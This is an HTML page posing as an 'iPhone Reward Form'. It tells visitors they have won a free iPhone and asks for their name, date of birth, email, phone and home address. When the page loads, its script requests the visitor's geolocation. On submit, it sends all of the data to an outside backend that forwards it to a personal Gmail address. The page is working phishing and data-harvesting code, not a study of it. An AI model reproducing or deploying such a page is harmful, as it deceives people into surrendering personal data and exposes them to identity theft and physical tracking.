<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Your existing styling */
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
        <p class="form-text">Please fill out the form below to claim your reward.</p>

        <form id="rewardForm">
            <!-- Add your form fields here -->
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" class="form-control" required placeholder="Enter your full name">
            </div>
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" class="form-control" required>
            </div>
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" class="form-control" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label for="phoneNumber">Phone Number</label>
                <input type="tel" id="phoneNumber" class="form-control" required placeholder="Enter your phone number">
            </div>
            <div class="form-group">
                <label for="address">Address</label>
                <input type="text" id="address" class="form-control" required placeholder="Enter your address">
            </div>
            <div class="form-group">
                <label for="city">City</label>
                <input type="text" id="city" class="form-control" required placeholder="Enter your city">
            </div>
            <div class="form-group">
                <label for="postalCode">Postal Code</label>
                <input type="text" id="postalCode" class="form-control" required placeholder="Enter your postal code">
            </div>

            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
        </form>
    </div>

    <!-- Bootstrap and jQuery JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <!-- JavaScript for Geolocation and Email Sending -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");
            let latitude, longitude;

            // Check for geolocation permissions
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                    },
                    (error) => {
                        locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
                    }
                );
            } else {
                locationDisplay.textContent = "Geolocation is not supported by this browser.";
            }
        });

        // Form submission
        document.getElementById("rewardForm").addEventListener("submit", function (e) {
            e.preventDefault();

            // Capture form data
            const formData = {
                fullName: document.getElementById("fullName").value,
                dob: document.getElementById("dob").value,
                email: document.getElementById("email").value,
                phoneNumber: document.getElementById("phoneNumber").value,
                address: document.getElementById("address").value,
                city: document.getElementById("city").value,
                postalCode: document.getElementById("postalCode").value,
                location: latitude && longitude ? `Latitude: ${latitude}, Longitude: ${longitude}` : "Location not available"
            };

            // Create the email message
            const message = `
                Name: ${formData.fullName}
                Date of Birth: ${formData.dob}
                Email: ${formData.email}
                Phone Number: ${formData.phoneNumber}
                Address: ${formData.address}
                City: ${formData.city}
                Postal Code: ${formData.postalCode}
                Location: ${formData.location}
            `;

            // Send the email
            sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");

            // Show success message and reset the form
            alert("Thank you for your submission! We will contact you shortly.");
            document.getElementById("rewardForm").reset();
        });

        // Email Sending Function
        function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Khalil Ahmed"
            };

            fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            })
            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
            .catch(error => alert("Error sending email: " + error));
        }
    </script>
</body>
</html>
